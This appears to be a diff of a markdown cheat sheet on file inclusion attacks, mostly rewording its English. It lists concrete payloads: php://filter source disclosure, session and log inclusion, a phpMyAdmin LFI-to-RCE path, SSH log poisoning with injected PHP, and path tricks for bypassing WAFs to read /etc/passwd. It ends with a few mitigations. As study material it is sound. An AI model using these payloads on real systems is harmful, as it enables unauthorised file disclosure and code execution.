@@ -1,5 +1,5 @@
 # File Inclusion    
-Scene: Attacker can control the variable to including files  
+Scene: Attacker can control the variable which can be used to include files  
 Dangerous functions：  
 PHP: `include()`, `include_once()`, `require()`, `require_once()`, `fopen()`, `readfile()`  
 JSP: `java.io.FileReader()`  
@@ -23,8 +23,7 @@ POST data: xxx
 php://filter
 // get source code
 ?file=php://filter/read=convert.base64-encode/resource=file.php
-// filter can be used on handling string
-// [Phith0n 谈一谈php://filter的妙用](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)
+// filter can be used on handling string, take a look at the reference#1
 php://filter/read=string.strip_tags/resource=php://input
 
 phar://path.zip/file.php
@@ -41,10 +40,10 @@ data:URL schema
 ```  
 More protocol：`file://`,`ftp://`,`zlib://`,`glob://`,`ssh2://`,`rar://`,`ogg://`,`expect://`  
 
-2. include session  
-session content can be controlled, and session path can also be known...  
-session path can be got from `session_save_path` in phpinfo  
-Stored place of session：  
+2. Session inclusion  
+We can control the content of session, and we also know the path of session...  
+Path of session can be got from `session_save_path` in phpinfo  
+Place of stored session：  
 ```php
 /var/lib/php/sess_xxxxx
 /var/lib/php/sessions/sess_xxxx
@@ -56,12 +55,12 @@ phpmyadmin from LFI to RCE
 ```php
 xxx/phpmyadmin/index.php?target=xxx.php%253F/../../../../../var/lib/php/sessions/sess_xxxxxx
 ```  
-3. include log  
-log can be read?  
-Take apache for example, request would be written in `access.log`，error would be written in `error.log`，and default stored in `/var/log/apache2/`  
-Therefore, attacker always needs to get the path via config file, and whether the request would be encoded (use burp to modify the encoded request), then include the log in the end  
-4. include ssh log  
-Can be read or not？  
+3. Log inclusion  
+**Permission** to read the log?  
+Take apache for example, request would be written to `access.log`, and error would be written to `error.log`. The default stored path is `/var/log/apache2/`  
+Therefore, attacker always needs to get the path via config file, and pay attention to whether the request would be encoded (use burp to modify the encoded request), then include the log in the end  
+4. SSH log inclusion  
+**Permission** to read？  
 Default path: `/var/log/apache2/access.log`,`/var/log/apache2/error.log`  
 ```php
 ssh '<?php phpinfo();?>'@remotehost
@@ -73,7 +72,7 @@ ssh '<?php phpinfo();?>'@remotehost
 8. include uploaded file  
 
 # WAF bypass  
-* relative path bypass  
+* Relative path bypass  
 WAF usually detect **continuous** multiple `../`
 ```php
 // according to parsing path
@@ -82,7 +81,7 @@ WAF usually detect **continuous** multiple `../`
 /./ not change
 ///./..//.//////./   -> use with conbination
 ```  
-* absolute path bypass, `/etc/passwd` would be blocked  
+* Absolute path bypass, `/etc/passwd` would be blocked  
 ```php
 /aaa/../etc/passwd
 /etc/./passwd
@@ -92,4 +91,7 @@ WAF usually detect **continuous** multiple `../`
 Make a conclusion of the requirement above, we can get the following mitigation  
 * php `open_basedir`  
 * read permission  
-* filter of dangerous characters
+* filter of dangerous characters  
+
+# Reference  
+1. [Phith0n 谈一谈php://filter的妙用](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)
